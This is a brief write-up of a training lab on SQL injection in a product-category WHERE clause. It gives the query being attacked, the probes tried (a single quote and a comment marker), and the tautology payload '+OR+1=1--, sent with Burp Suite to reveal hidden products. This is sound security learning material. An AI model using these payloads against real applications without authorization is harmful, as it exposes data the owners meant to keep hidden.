Description:
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SQL Injection Vulnerability in Products Category

End Goal:
Display all products that are released and non-released.

Analisys:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' \\ Using s singe quote to test the application, if we get internal servrr error is an indication that the server is vulnerable to SQLi.

SELECT * FROM products WHERE category = '-- AND released = 1 \\ Using this query with -- to tell SQL to ignore anything after the -- will prove if the server is vulnerable to SQLi.

SELECT * FROM products WHERE category = 'OR 1=1 Adding OR statement with 1=1 and telling SQL to ignore everthing after will work and get all the data. '+OR 1=1-- works as well.



Solution:


1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the category parameter, giving it the value '+OR+1=1--
3. Submit the request, and verify that the response now contains additional items.
